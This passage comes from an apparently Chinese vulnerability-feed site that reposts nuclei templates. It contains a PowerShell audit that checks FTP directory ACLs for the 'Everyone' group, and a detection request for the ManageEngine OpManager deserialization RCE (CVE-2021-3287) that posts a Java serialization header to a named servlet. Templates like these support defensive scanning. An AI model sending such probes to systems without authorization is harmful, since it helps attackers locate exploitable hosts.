    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Windows Shutdown Without Logon Check Vu</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="配置问题" scheme="http://example.com/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>FTP Directory Access Permission Check</title>
    <link href="http://example.com/2025/06/26/github_2988092094/"/>
    <id>http://example.com/2025/06/26/github_2988092094/</id>
    <published>2025-06-26T11:15:46.692Z</published>
    <updated>2025-06-26T11:15:46.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FTP Directory Access Permission Check</p><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保FTP主目录的访问权限中不包括’Everyone’组。授予该组访问权限可能导致未授权用户查看、修改或篡改FTP文件。</p><p><strong>产品名称：</strong> FTP</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fftp-directory-permission-check.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fftp-directory-permission-check.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> ftp-directory-permission-check<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> FTP Directory Access Permission Check<br>  <span class="hljs-params">author:</span> nukunga[SungHyunJeon]<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Ensure that the FTP home directory does not include the <span class="hljs-string">&quot;Everyone&quot;</span> group <span class="hljs-keyword">in</span> its access permissions. Granting access to this group may allow unauthorized users to view, modify, <span class="hljs-keyword">or</span> tamper <span class="hljs-keyword">with</span> FTP files.<br>  <span class="hljs-params">impact:</span> |<br>    Assigning access to the <span class="hljs-string">&quot;Everyone&quot;</span> group for the FTP home directory can result <span class="hljs-keyword">in</span> information exposure, file tampering, <span class="hljs-keyword">or</span> unauthorized changes.<br>  <span class="hljs-params">remediation:</span> |<br>    Remove the <span class="hljs-string">&quot;Everyone&quot;</span> group from FTP home directory permissions using the following <span class="hljs-params">methods:</span><br>    <span class="hljs-operator">-</span> IIS <span class="hljs-params">Manager:</span> Review and adjust the FTP site&#x27;s home directory settings.<br>    <span class="hljs-operator">-</span> File <span class="hljs-params">Explorer:</span> Right-click the directory, select <span class="hljs-string">&quot;Properties&quot;</span> → go to the <span class="hljs-string">&quot;Security&quot;</span> tab, and remove the <span class="hljs-string">&quot;Everyone&quot;</span> group.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>isms.kisa.<span class="hljs-keyword">or</span>.kr<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>csap<span class="hljs-operator">/</span>notice<span class="hljs-operator">/</span><span class="hljs-operator">?</span>boardId<span class="hljs-operator">=</span>bbs_0000000000000004&amp;mode<span class="hljs-operator">=</span>view&amp;cntId<span class="hljs-operator">=</span><span class="hljs-number">85</span><br>  <span class="hljs-params">tags:</span> ftp,iis,security,windows,code,windows-audit,kisa<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">pre-condition:</span> |<br>      IsWindows();<br>    <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> powershell<br>      <span class="hljs-operator">-</span> powershell.exe<br>    <span class="hljs-params">args:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-operator">-</span>ExecutionPolicy<br>      <span class="hljs-operator">-</span> Bypass<br>    <span class="hljs-params">pattern:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br>    <span class="hljs-params">source:</span> |<br>      <span class="hljs-comment"># Define the FTP home directory path (adjust if necessary)</span><br>      $ftpHome <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\i</span>netpub<span class="hljs-char escape_">\f</span>tproot&quot;</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>(Test-Path $ftpHome)) &#123;<br>          <span class="hljs-string">&quot;FTP_HOME_DIRECTORY_NOT_FOUND&quot;</span><br>          exit<br>      &#125;<br>      <span class="hljs-comment"># Retrieve the ACL for the FTP home directory</span><br>      $acl <span class="hljs-operator">=</span> Get-Acl $ftpHome<br>      $vulnerable <span class="hljs-operator">=</span> $<span class="hljs-literal">false</span><br>      foreach ($ace <span class="hljs-keyword">in</span> $acl.Access) &#123;<br>          <span class="hljs-keyword">if</span> ($ace.IdentityReference.ToString() <span class="hljs-operator">-</span>like <span class="hljs-string">&quot;*Everyone*&quot;</span>) &#123;<br>              $vulnerable <span class="hljs-operator">=</span> $<span class="hljs-literal">true</span><br>              break<br>          &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ($vulnerable) &#123;<br>          <span class="hljs-string">&quot;FTP_HOME_DIRECTORY_EVERYONE_FOUND&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;FTP_HOME_DIRECTORY_NO_EVERYONE&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;FTP_HOME_DIRECTORY_EVERYONE_FOUND&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FTP Directory Access Permission Check&lt;/</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>ManageEngine OpManager 反序列化远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/26/github_71160588/"/>
    <id>http://example.com/2025/06/26/github_71160588/</id>
    <published>2025-06-26T11:15:36.920Z</published>
    <updated>2025-06-26T11:15:36.917Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ManageEngine OpManager 反序列化远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-3287</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> ManageEngine OpManager存在一个预认证的Java反序列化漏洞，允许远程代码执行。此模板测试CVE-2021-3287补丁绕过行为。</p><p><strong>产品厂商：</strong> ManageEngine</p><p><strong>产品名称：</strong> OpManager</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/90d485fe58f4ca5d4e3088a0cd039be5df57b2c5/http%2Fcves%2F2021%2FCVE-2021-3287.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/90d485fe58f4ca5d4e3088a0cd039be5df57b2c5/http%2Fcves%2F2021%2FCVE-2021-3287.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">3287</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> ManageEngine OpManager Deserialization RCE <span class="hljs-operator">-</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">3287</span><br>  <span class="hljs-params">author:</span> tomaquet18<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    ManageEngine OpManager is vulnerable to a pre-authentication Java deserialization vulnerability<br>    that allows for remote code execution. This template tests for CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">3287</span> patch bypass behavior.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>haxolot.com<span class="hljs-operator">/</span>posts<span class="hljs-operator">/</span><span class="hljs-number">2021</span><span class="hljs-operator">/</span>manageengine_opmanager_pre_auth_rce<span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2021-3287</span><br>  <span class="hljs-params">tags:</span> rce,java,deserialization,opmanager,cve,cve2021<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/octet-stream</span><br>        <span class="hljs-params">Content-Length:</span> <span class="hljs-number">10</span><br><br>        &#123;&#123;hex_decode(<span class="hljs-string">&quot;aced00057704000003ea&quot;</span>)&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> binary<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">binary:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;aced0005&quot;</span> <span class="hljs-comment"># Java serialization stream header</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ManageEngine OpManager 反序列化远程代码执行漏洞&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
